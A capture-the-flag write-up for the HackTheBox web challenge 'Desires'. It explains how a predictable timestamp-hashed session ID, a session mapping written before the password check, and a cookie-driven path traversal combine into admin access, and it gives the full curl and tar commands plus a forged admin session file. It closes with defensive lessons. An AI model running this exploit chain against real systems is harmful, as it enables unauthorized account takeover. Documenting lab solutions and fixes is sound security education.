---
ctf: HTBLabs
title: Desires
category: web
difficulty: unknown
tags: []
flag_format: HTB{...}
date: 2026-08-11
---

# Desires

## Challenge
As survivors face the vault, anticipation thickens the air, igniting desires for power and glory. Subtle glances reveal hidden ambitions. Unbeknownst to them, toxic gas twists thoughts, fueling greed and paranoia. IP:154.57.164.78:30143

## Approach

### 1. Source review

The web application consists of a Go/Fiber front end and an internal Node/SQLite
authentication service. Three implementation details combine into the exploit.

First, `LoginHandler` creates a predictable session ID:

```go
sessionID := fmt.Sprintf("%x", sha256.Sum256(
    []byte(strconv.FormatInt(time.Now().Unix(), 10)),
))
```

The filename is therefore `SHA256(str(Unix timestamp in seconds))`.

More importantly, `PrepareSession` runs **before** the password is checked:

```go
err := PrepareSession(sessionID, credentials.Username)
user, err := loginUser(credentials.Username, credentials.Password)
```

`PrepareSession` stores `username -> sessionID` in Redis. A failed login thus
still creates or replaces this mapping for any attacker-controlled username.

Finally, `SessionMiddleware` ignores the value of the `session` cookie after
checking that it is nonempty. It trusts the separate `username` cookie:

```go
sessionID := c.Cookies("session")
username := c.Cookies("username")
session, err := GetSession(username)
```

`GetSession` retrieves the real session ID from Redis and uses the unvalidated
username in a filesystem path:

```go
sessionID, _ := utils.RedisClient.Get(username)
sessionJSON, _ := os.ReadFile(filepath.Join(
    "/tmp/sessions", username, sessionID,
))
```

Unlike registration, login and cookie processing do not reject `/` or `.`.
Consequently, a username such as:

```text
../../app/service/files/ATTACKER
```

makes the session read resolve to:

```text
/app/service/files/ATTACKER/<predictable-session-id>
```

That is the attacker's archive extraction directory.

### 2. Create an ordinary account

```bash
TARGET=http://154.57.164.78:30143
USER=solver8147
PASS=solverpass8147

curl -i -c cookies.txt -X POST \
  -d "username=$USER&password=$PASS" \
  "$TARGET/register"

curl -i -b cookies.txt -c cookies.txt -X POST \
  -d "username=$USER&password=$PASS" \
  "$TARGET/login"
```

The authenticated account is needed only to access `/user/upload`.

### 3. Poison Redis with a path-traversal username

Submit a deliberately invalid login and preserve its response headers:

```bash
TRAVERSAL="../../app/service/files/$USER"

curl -i -D failed-login.headers -X POST \
  --data-urlencode "username=$TRAVERSAL" \
  --data-urlencode 'password=wrong' \
  "$TARGET/login"
```

The response is `400 Invalid username or Password`, but the Redis mapping was
already written. The HTTP `Date` header gives the server second used to derive
the session ID. In this run it was:

```text
Date: Tue, 11 Aug 2026 14:08:24 GMT
```

Convert that time and reproduce the hash:

```bash
TS=$(date -u -d 'Tue, 11 Aug 2026 14:08:24 GMT' +%s)
SID=$(printf '%s' "$TS" | sha256sum | cut -d' ' -f1)
```

Values from the successful run:

```text
TS  = 1786457304
SID = d50bd8fb56f584dc53701434818a18f52172e1b50ab76fb525c4a343f2ba2a80
```

If network or server timing crosses a one-second boundary, generate entries for
`TS-1`, `TS`, and `TS+1`; only the Redis-selected filename will be loaded.

### 4. Upload a forged admin session

The JSON schema is determined by the Go `User` structure. Create this file:

```json
{"username":"admin","id":1,"role":"admin"}
```

Place it in a tar archive under the calculated session filename:

```bash
tar -cf session.tar \
  --transform="s|payload.json|$SID|" \
  payload.json

tar -tf session.tar
```

Then upload it as the ordinary authenticated user:

```bash
curl -i -b cookies.txt \
  -F archive=@session.tar \
  "$TARGET/user/upload"
```

The server extracts the JSON to:

```text
/app/service/files/solver8147/d50bd8fb...f2ba2a80
```

### 5. Load the forged session

Send any nonempty `session` value and the same traversal string as `username`:

```bash
curl -i \
  -H "Cookie: session=x; username=$TRAVERSAL" \
  "$TARGET/user/admin"
```

Redis resolves the traversal username to the predictable filename, the path
traversal resolves into the upload directory, and the JSON decoder constructs a
`User{Role: "admin"}`. The admin handler consequently renders the flag.

### Why archive traversal was not required

The upload feature initially suggests Zip Slip or tar symlink traversal. Direct
`../../` tar members are rejected by `mholt/archiver`'s `CheckPath`, and a
directory symlink followed by a child entry fails when the extractor calls
`MkdirAll` on the symlink. The archive only needs to write a normal file into the
attacker's own extraction folder. The actual traversal occurs later in
`GetSession`, through the cookie-controlled username.

## Tools

- `rg` and `sed` for source review
- `curl` for registration, login, upload, and the final authenticated request
- `date`, `sha256sum`, and `cut` to reproduce the time-derived session ID
- GNU `tar` to rename the forged JSON entry inside the upload archive

## Lessons

- Never mutate authentication/session state until credentials are verified.
- Session identifiers must be cryptographically random, not hashes of timestamps.
- A session should have one authoritative opaque token; do not use a second,
  client-controlled cookie to select server-side session state.
- Treat every path component derived from a request as hostile. Prefer random
  server-side identifiers and verify that the final canonical path stays beneath
  an intended base directory.
- Upload extraction was a useful write primitive, but the decisive flaw was in
  the later consumer of the extracted file.
- Recommended fix: authenticate first, generate a random session token, store the
  complete session server-side keyed only by that token, and remove `username`
  from session path construction entirely.

## Flag

```text
HTB{redacted}
```
